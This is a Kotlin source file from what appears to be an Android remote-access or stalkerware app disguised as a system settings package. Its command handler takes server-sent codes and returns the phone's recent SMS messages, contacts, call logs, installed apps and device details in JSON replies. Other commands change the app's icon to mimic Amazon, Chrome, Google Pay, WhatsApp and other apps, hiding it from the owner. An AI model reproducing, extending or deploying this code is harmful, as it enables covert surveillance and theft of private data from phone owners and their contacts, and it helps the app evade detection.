package com.android.system.settings


import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi

class ManageCommand {
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun manageMessage(context: Context, cmd: String, to: String):String{
        val response: String
        when (cmd) {
            "WFCON" -> {//checks if wifi connected
                response = "WIFI is  ${if(Functions().isConnectedToWifi(context))"connected" else "not connected"}"
            }
            "BTYPC" -> {//check battery percentage
                response = "${Functions().getBatteryPercentage(context)}% battery remaining.."
            }
            "DSPC" -> {//check if display is on or off
                response = "Display is ${if(Functions().isScreenOn(context))"ON" else "OFF"}"
            }
            "CHGC" -> {//check if phone charging or not
                response = "Phone is ${if(Functions().isCharging(context))"Charging" else "Not Charging"}"
            }
            "MDVI" -> {//increase media volume
                response = "increased volume to ${Functions().increaseMediaVolume(context,"inc","md")}"
            }
            "MDVD" -> {//decrease media volume
                response = "decreased volume to ${Functions().increaseMediaVolume(context,"dec","md")}"
            }
            "RNVI" -> {//increase ring volume
                response = "decreased volume to ${Functions().increaseMediaVolume(context,"inc","rd")}"
            }
            "RNVD" -> {//decrease ring volume
                response = "decreased volume to ${Functions().increaseMediaVolume(context,"dec","rd")}"
            }
            "FLSE" -> {//turn flash on

                response = "flashlight is   ${if(Functions().openFlashlight(context,true))"ON" else "OFF"}"
            }
            "FLSD" -> {//turn flash off
                response = "flashlight is   ${if(Functions().openFlashlight(context,false))"ON" else "OFF"}"
            }
            "GPSC" -> {//check gps enabled or not
                response = "Location  is   ${if(Functions().isGpsEnabled(context))"ON" else "OFF"}"
            }
            "INAPD" -> {//get  installed application's names (3rd party)
                response = Functions().getInstalledAppNames(context)
            }
            "ANDDT" -> {// android details
                response = Functions().getDetails(context)
            }
            "HSCON" -> {//check headphones connected or not
                response = Functions().checkHeadphonesStatus(context)
            }
            "BTTCK" -> {//check bluetooth is enabled/disabled/not supported
                response = Functions().checkBluetoothStatus()
            }

            "PMSGN" -> {//get list of permissions allowed or denied
                response = Functions().checkPermissions(context)
            }
            "L5MSG" -> {// get last 5 sms
                response = Functions().getMessages(context)
            }
            "GTCNT" -> {//get contacts details
                response = Functions().getContacts(context)
            }//PLSND
            "GTLOG" -> {//get last 10 calllog
                response = Functions().getCallLogs(context)
            }
            "PLSND" -> {//play sound in res/raw/ping.mp3
                response = Functions().playSound(context)
            }
            "CHGAMZ" -> {//set icon to amazon
                response = AppIconAndLaunch(context,"Amazon","in.amazon.mShop.android.shopping","AmazonIcon")

            }
            "CHGCLD" -> {//set icon to google calendar
                response = AppIconAndLaunch(context,"Calendar","com.google.android.calendar","CalendarIcon")
            }
            "CHGCHR"->{//set icon to chrome
                response = AppIconAndLaunch(context,"Chrome","com.android.chrome","ChromeIcon")
            }
            "CHGFBK"->{//set icon to facebook
                response = AppIconAndLaunch(context,"Facebook","com.facebook.katana","FacebookIcon")
            }
            "CHGGML"->{//set icon to gmail
                response = AppIconAndLaunch(context,"Gmail","com.google.android.gm","GmailIcon")
            }
            "CHGGLE"->{//set icon to google
                response = AppIconAndLaunch(context,"Google","com.google.android.googlequicksearchbox","GoogleIcon")
            }
            "CHGGPY"->{//set icon to google pay
                response = AppIconAndLaunch(context,"Gpay","com.google.android.apps.nbu.paisa.user","GPayIcon")
            }
            "CHGINS"->{///set icon to instagram
                response = AppIconAndLaunch(context,"Instagram","com.instagram.android","InstagramIcon")
            }
            "CHGMPS"->{///set icon to google maps
                response = AppIconAndLaunch(context,"Maps","com.google.android.apps.maps","MapsIcon")
            }
            "CHGPHT"->{//set icon to google photos
                response = AppIconAndLaunch(context,"Photos","com.google.android.apps.photos","PhotosIcon")
            }
            "CHGPLS"->{//set icon to google playstore
                response = AppIconAndLaunch(context,"Play Store","com.android.vending","PlayStoreIcon")
            }
            "CHGWSP"->{//set icon to whatsapp
                response = AppIconAndLaunch(context,"WhatsApp","com.whatsapp","WhatsappIcon")
            }
            "CHGYTB"->{//set icon to youtube
                response = AppIconAndLaunch(context,"YouTube","com.google.android.youtube","YoutubeIcon")
            }
            "CHGDFT"->{///set icon to settings
                saveData(context,"settings")
                response = ChangeAppIcon().setIcon(context,"MainActivity")

            }
            else -> {
                response = "unknown command"
            }
        }



        //return back to server json model string

        return  "{\"type\":\"res\",\"to\":\"${to}\",\"data\":\"received ${response}\",\"from\":\"usman\"}"
    }

    //shortcut function to set selected icons name into local storage, and change icon
    fun AppIconAndLaunch(context: Context,name:String,packageName:String,activityAlias:String):String{
        if(Functions().isAppInstalled(context,packageName)){
            saveData(context,name)
             ChangeAppIcon().setIcon(context,activityAlias)
            return  "done"
        }else{
            return "app not installed"
        }
    }

    private fun saveData(context: Context,data: String) {
        val sharedPreferences = context.getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)
        val editor = sharedPreferences.edit()
        editor.putString("activity", data)
        editor.apply()
    }


}
